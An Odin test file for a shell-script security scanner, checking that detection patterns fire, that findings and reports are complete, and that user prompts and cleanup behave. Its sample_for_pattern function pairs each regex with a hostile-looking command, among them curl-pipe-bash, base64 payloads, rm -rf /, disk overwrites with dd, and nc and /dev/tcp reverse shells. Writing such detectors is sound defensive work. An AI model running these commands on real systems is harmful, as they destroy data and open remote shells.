package test

import "core:fmt"
import "core:os"
import "core:strings"
import "core:testing"

import "../src/security"

test_prompt_value: string

fixed_prompt_reader :: proc() -> string {
	return test_prompt_value
}

write_security_file :: proc(dir: string, name: string, content: string) -> string {
	path := strings.concatenate({dir, "/", name})
	os.write_entire_file(path, transmute([]u8)content)
	return path
}

sample_for_pattern :: proc(p: security.Pattern) -> string {
	switch p.pattern {
	case `curl\s+.*\|\s*bash`:
		return "curl https://example.com/install.sh | bash"
	case `wget\s+.*\|\s*sh`:
		return "wget https://example.com/install.sh | sh"
	case `eval\s+\$\(curl`:
		return "eval $(curl https://example.com/payload)"
	case `base64\s+.*-d.*\|\s*(bash|sh)`:
		return "echo Y3VybCBodHRwOi8vZXhhbXBsZS5jb20gfCBiYXNo | base64 -d | bash"
	case `\$\([^)]*(curl|wget)`:
		return "$(curl https://example.com/payload)"
	case `<\([^)]*(curl|wget)`:
		return "<(wget https://example.com/payload)"
	case `printf\s+\"\\\\x[0-9a-fA-F]{2}`:
		return "printf \"\\x63\\x75\\x72\\x6c\""
	case `xxd\s+-r\s+-p`:
		return "xxd -r -p payload.hex"
	case `;\s*\$\(`:
		return "echo ok;$(whoami)"
	case `\|\s*\$\(`:
		return "echo ok | $(whoami)"
	case `&&\s*curl`:
		return "true && curl https://example.com/payload"
	case `\|\|\s*wget`:
		return "false || wget https://example.com/payload"
	case `\|\s*sed.*-e.*\|`:
		return "cat file | sed -e 's/a/b/' | sed -e 's/c/d/'"
	case `sed.*'s/.*\$\([^']*\)'`:
		return "sed 's/$(whoami)/x/' file"
	case `rm\s+-rf\s+/`:
		return "rm -rf /"
	case `dd\s+if=`:
		return "dd if=/dev/zero of=/dev/sda"
	case `>\s*/dev/sda`:
		return "echo boom > /dev/sda"
	case `>\s*/dev/nvme`:
		return "echo boom > /dev/nvme0n1"
	case `/dev/tcp/`:
		return "bash -c 'echo ok >/dev/tcp/127.0.0.1/4444'"
	case `/dev/udp/`:
		return "bash -c 'echo ok >/dev/udp/127.0.0.1/4444'"
	case `nc\s+-e\s+/bin/sh`:
		return "nc -e /bin/sh 127.0.0.1 4444"
	case `socat\s+exec:`:
		return "socat exec:/bin/sh tcp:127.0.0.1:4444"
	case `ptrace`:
		return "ptrace PTRACE_ATTACH 1234"
	case `/proc/[^\\s]+/mem`:
		return "cat /proc/1234/mem"
	case `LD_PRELOAD`:
		return "LD_PRELOAD=/tmp/inject.so ls"
	case `DYLD_INSERT_LIBRARIES`:
		return "DYLD_INSERT_LIBRARIES=/tmp/inject.dylib ls"
	case `/proc/self/exe`:
		return "cat /proc/self/exe"
	case `/proc/\\d+/root`:
		return "ls /proc/1234/root"
	case `nsenter`:
		return "nsenter -t 1 -m /bin/sh"
	case `/sys/fs/cgroup`:
		return "ls /sys/fs/cgroup"
	case `curl\s+http://`:
		return "curl http://example.com/data.json"
	case `chmod\s+\+s`:
		return "chmod +s /usr/local/bin/tool"
	case `sudo\s+`:
		return "sudo ls -la"
	case `>>\s+~/.zshrc`:
		return "echo 'test' >> ~/.zshrc"
	case `>>\s+~/.bashrc`:
		return "echo 'test' >> ~/.bashrc"
	}
	return p.pattern
}

make_scan_result_for_report :: proc() -> security.Scan_Result {
	critical_pattern := security.Pattern{
		severity = .Critical,
		pattern = `curl\s+.*\|\s*bash`,
		description = "Download and execute via curl",
	}
	warning_pattern := security.Pattern{
		severity = .Warning,
		pattern = `sudo\s+`,
		description = "Privilege escalation",
	}

	findings := make([dynamic]security.Finding)
	append(&findings, security.Finding{
		pattern = critical_pattern,
		file_path = strings.clone("/tmp/critical.sh"),
		line_number = 3,
		line_text = strings.clone("curl https://example.com | bash"),
	})
	append(&findings, security.Finding{
		pattern = warning_pattern,
		file_path = strings.clone("/tmp/warn.sh"),
		line_number = 7,
		line_text = strings.clone("sudo ls -la"),
	})

	return security.Scan_Result{
		success = true,
		critical_count = 1,
		warning_count = 1,
		findings = findings,
	}
}

// Feature: module-security, Property 1: Pattern Detection Completeness
@(test)
test_property_security_pattern_detection_completeness :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_prop_patterns")
	defer teardown_test_environment(temp_dir)

	patterns := make([dynamic]security.Pattern)
	critical := security.get_critical_patterns()
	for p in critical {
		append(&patterns, p)
	}
	warnings := security.get_warning_patterns()
	for p in warnings {
		append(&patterns, p)
	}
	delete(critical)
	delete(warnings)
	defer delete(patterns)

	for pattern, idx in patterns {
		file_name := fmt.tprintf("pattern_%d.sh", idx)
		line := sample_for_pattern(pattern)
		path := write_security_file(temp_dir, file_name, line)
		defer delete(path)

		result := security.scan_module(temp_dir, security.Scan_Options{})
		defer security.cleanup_scan_result(&result)

		testing.expect(t, len(result.findings) > 0, "pattern should be detected")
	}
}

// Feature: module-security, Property 2: Finding Structure Completeness
@(test)
test_property_security_finding_structure :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_prop_findings")
	defer teardown_test_environment(temp_dir)

	path := write_security_file(temp_dir, "sample.sh", "curl https://example.com | bash")
	defer delete(path)

	result := security.scan_module(temp_dir, security.Scan_Options{})
	defer security.cleanup_scan_result(&result)

	for finding in result.findings {
		testing.expect(t, finding.file_path != "", "finding must have file path")
		testing.expect(t, finding.line_number > 0, "finding must have positive line number")
		testing.expect(t, finding.line_text != "", "finding must have line text")
	}
}

// Feature: module-security, Property 3: Language-Agnostic File Selection
@(test)
test_property_security_file_selection_by_extension :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_prop_files")
	defer teardown_test_environment(temp_dir)

	result := security.Scan_Result{}
	defer security.cleanup_scan_result(&result)

	supported := []string{".sh", ".bash", ".zsh", ".fish", ".py", ".rb", ".js"}
	for ext, idx in supported {
		name := fmt.tprintf("file_%d%s", idx, ext)
		path := write_security_file(temp_dir, name, "echo ok")
		defer delete(path)
		testing.expect(t, security.is_scannable_file(path, temp_dir, &result), "text files should be scannable")
	}

	unsupported_path := write_security_file(temp_dir, "file.txt", "echo ok")
	defer delete(unsupported_path)
	testing.expect(t, security.is_scannable_file(unsupported_path, temp_dir, &result), "text files should be scannable regardless of extension")

	shebang_path := write_security_file(temp_dir, "script", "#!/bin/sh\necho ok")
	defer delete(shebang_path)
	testing.expect(t, security.is_scannable_file(shebang_path, temp_dir, &result), "shebang file should be scannable")
}

// Feature: module-security, Property 5: Error Message Completeness
@(test)
test_property_security_error_message_completeness :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	result := make_scan_result_for_report()
	defer security.cleanup_scan_result(&result)

	report := security.format_scan_report(&result, "test-module")
	defer delete(report)

	testing.expect(t, strings.contains(report, "CRITICAL"), "report should include critical section")
	testing.expect(t, strings.contains(report, "WARNINGS"), "report should include warnings section")
	testing.expect(t, strings.contains(report, "Pattern:"), "report should include pattern text")
	testing.expect(t, strings.contains(report, "/tmp/critical.sh:3"), "report should include critical file path and line")
	testing.expect(t, strings.contains(report, "/tmp/warn.sh:7"), "report should include warning file path and line")
}

// Feature: module-security, Property 7: User Response Handling
@(test)
test_property_security_user_response_handling :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	result := make_scan_result_for_report()
	defer security.cleanup_scan_result(&result)

	yes_inputs := []string{"y", "Y", "yes", "YES"}
	no_inputs := []string{"n", "N", "no", "NO"}

	for input in yes_inputs {
		test_prompt_value = input
		testing.expect(t, security.prompt_user_for_warnings(&result, "test-module", fixed_prompt_reader), "yes inputs should allow")
	}
	for input in no_inputs {
		test_prompt_value = input
		testing.expect(t, !security.prompt_user_for_warnings(&result, "test-module", fixed_prompt_reader), "no inputs should block")
	}
}

// Feature: module-security, Property 6.2: Memory Cleanup
@(test)
test_property_security_cleanup_idempotent :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	result := make_scan_result_for_report()
	result.error_message = strings.clone("scan failed")

	security.cleanup_scan_result(&result)
	security.cleanup_scan_result(&result)

	testing.expect(t, result.findings == nil, "findings should be nil after cleanup")
	testing.expect(t, result.error_message == "", "error message should be cleared after cleanup")
	testing.expect(t, result.critical_count == 0, "critical count should be reset after cleanup")
	testing.expect(t, result.warning_count == 0, "warning count should be reset after cleanup")
	testing.expect(t, !result.success, "success should be false after cleanup")
}
